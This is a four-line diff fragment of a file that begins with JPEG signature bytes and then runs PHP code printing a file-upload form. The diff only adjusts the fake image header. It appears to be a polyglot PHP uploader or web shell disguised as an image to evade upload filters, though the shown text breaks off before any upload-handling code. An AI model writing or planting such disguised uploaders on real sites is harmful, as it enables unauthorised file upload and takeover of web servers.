@@ -1,4 +1,4 @@
-ÿØÿàQ
+ÿØ
 <?php
 echo "<form action='' enctype='multipart/form-data' method='POST'>
 <input type='file' name='filena'>
